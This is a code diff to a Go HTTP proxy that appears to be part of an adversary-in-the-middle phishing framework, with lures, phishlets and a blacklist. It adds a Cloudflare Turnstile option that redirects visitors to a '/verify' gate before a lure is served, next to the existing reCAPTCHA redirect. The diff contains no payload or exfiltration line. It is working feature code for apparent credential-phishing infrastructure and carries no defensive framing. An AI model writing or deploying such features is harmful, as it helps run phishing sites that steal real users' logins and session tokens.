@@ -74,6 +74,7 @@ type HttpProxy struct {
     ip_mtx            sync.Mutex
     livefeed		  bool
     recaptcha         bool
+    turnstile         bool
 }
 
 type ProxySession struct {
@@ -83,7 +84,7 @@ type ProxySession struct {
     Index       int
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, livefeed bool, recaptcha bool) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, livefeed bool, recaptcha bool, turnstile bool) (*HttpProxy, error) {
     p := &HttpProxy{
         Proxy:             goproxy.NewProxyHttpServer(),
         Server:            nil,
@@ -99,6 +100,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
         auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
         livefeed:          livefeed,
         recaptcha:         recaptcha,
+        turnstile:         turnstile,
     }
     
     p.Server = &http.Server{
@@ -292,6 +294,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     req_ok = true
                                     if p.recaptcha {
                                         return p.redirectCaptcha(req)
+                                    } else if p.turnstile {
+                                        return p.redirectTurnstile(req)
                                     }
                                 }
                             } else {
@@ -344,6 +348,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                         if p.recaptcha {
                             if !s.IsCaptchaDone {
                                 return p.redirectCaptcha(req)
+                            }
+                        } else if p.turnstile {
+                            if !s.IsCaptchaDone {
+                                return p.redirectTurnstile(req)
                             }
                         }
                         l, err := p.cfg.GetLureByPath(pl_name, req_path)
@@ -967,6 +975,16 @@ func (p *HttpProxy) redirectCaptcha(req *http.Request) (*http.Request, *http.Res
     resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
     if resp != nil {
         redirect_url := "http://" + req.Host + "/recaptcha"
+        resp.Header.Add("Location", redirect_url)
+        return req, resp
+    }
+    return req, nil
+}
+
+func (p *HttpProxy) redirectTurnstile(req *http.Request) (*http.Request, *http.Response) {
+    resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+    if resp != nil {
+        redirect_url := "http://" + req.Host + "/verify"
         resp.Header.Add("Location", redirect_url)
         return req, resp
     }
